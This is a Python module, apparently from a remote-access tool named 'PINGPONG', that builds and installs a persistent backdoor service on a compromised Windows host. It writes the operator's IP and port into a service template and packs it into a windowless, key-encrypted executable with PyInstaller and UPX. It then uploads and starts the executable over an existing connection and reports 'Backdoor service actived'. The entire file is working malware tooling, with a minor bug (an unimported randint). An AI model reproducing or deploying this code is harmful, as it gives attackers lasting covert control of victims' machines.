# -*- coding:utf-8 -*-
# @FileName  :persistence_service.py
# @Time      :2023/01/12 16:37:49
# @Author    :D0WE1L1N
from sys import path as _envir_path
_envir_path.append('..')
from main import print_good, print_normal, print_error, print_warn
from payload.payload_packer import generate_random_str
import PINGPONG_script.addsend as app_send
from os import mkdir, system, remove
from shutil import rmtree, copyfile
from os.path import exists, getsize, exists
def clear_pyinstaller_tmp(name, copytodir):
    rmtree('./build')
    remove(f'./{name}.spec')
    copyfile(f'./dist/{name}.exe', copytodir)
    rmtree('./dist')
def generate_random_str(randomlength=16):
	random_str =''
	base_str ='ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
	length =len(base_str) -1
	for i in range(randomlength):
		random_str +=base_str[randint(0, length)]
	return random_str
def run(conn, addr, my_addr):
    if app_send.App_send('PERS_APP', True, conn, addr, my_addr):
        pingpong_dir = conn.recv(1024).decode('utf8')
        if pingpong_dir == 'HAVEIT':
            print_warn('PINGPONG>[!]The host already has Pingpong service')
            print_normal('PINGPONG>[*]Remove it......')
            conn.recv(1024)
            conn.send(b'OK')
            print_normal('PINGPONG>[*]Done')
        if exists('./PINGPONG_script/basic_command/TEMP'):
            rmtree('./PINGPONG_script/basic_command/TEMP')
        mkdir('./PINGPONG_script/basic_command/TEMP')
        copyfile('./PINGPONG_script/basic_command/SOURCE_FILE/pingpong_service.py','./PINGPONG_script/basic_command/TEMP/pingpong_service.py')
        print_normal('PINGPONG>[*]Writing service file......')
        with open('./PINGPONG_script/basic_command/SOURCE_FILE/pingpong_service.py', 'r') as pay:
            count = 0
            lines = []
            for line in pay.readlines():
                lines.append(line)
                count += 1
                if '#WRITE_IN_LINE_FOR_IP_AND_PORT' in line:
                    write_line = count
            lines.insert(write_line, f'        self.ip, self.port = "{my_addr[0]}", {my_addr[1]}')
            lines.insert(write_line+1, f'       _id = "{generate_random_str()}"')
        
        pay_line = ''.join(lines)
        with open('./PINGPONG_script/basic_command/TEMP/pingpong_service.py', 'w+') as pay:
            pay.write(pay_line)
        upx = input('PINGPONG>[*]Please input your upx location to pack the service(.exe file)(blank for none)>')
        if exists(upx):
            upx = '--upx-dir ' + upx
        elif upx == '':
            print_warn("PINGPONG>[!]Generating without UPX, you'd better install one")
        elif upx == 'back' or upx == 'BACK':
            print_normal('Back to main......')
            conn.send(b'BACK')
        else:
            print_error('PINGPONG>[-]The UPX location does NOT valuable')
            print_warn("PINGPONG>[!]Generating without UPX")
            upx = ''
            
        print_normal('PINGPONG>[*]Service packing......PLEASE WAIT FOR IT')
        system(f"pyinstaller -p {_envir_path[4]}/Lib/site-packages -F PINGPONG_script/basic_command/TEMP/pingpong_service.py {upx} --key servicekey -w --log-level CRITICAL --hiddenimport win32timezone")     
        clear_pyinstaller_tmp('pingpong_service', './PINGPONG_script/basic_command/TEMP/pingpong_service.exe')
        conn.send(b'OK')
        with open('PINGPONG_script/basic_command/TEMP/pingpong_service.exe', 'rb') as f:
            pingpong_service = f.read()
        print_normal('PINGPONG>[*]Packing done')
        conn.send(bytes(str(getsize('PINGPONG_script/basic_command/TEMP/pingpong_service.exe')), 'utf8'))
        print_normal(f'PINGPONG>[*]Uploading service ({len(pingpong_service)} bytes) to {pingpong_dir}......')
        connect_choice = conn.recv(1024).decode('utf8')
        if connect_choice == 'OOKK':
            conn.sendall(pingpong_service)
            conn.recv(1024)
            print_normal('PINGPONG>[*]Upload done')
            print_normal('PINGPONG>[*]Starting service')
            conn.recv(1024)
            print_normal('PINGPONG>[*]Done')
            print_good(f'PINGPONG>[+]Backdoor service actived in {my_addr[0]}:{my_addr[1]} >>> {addr[0]}:{addr[1]}')
            return True
def init_is_open():
    return True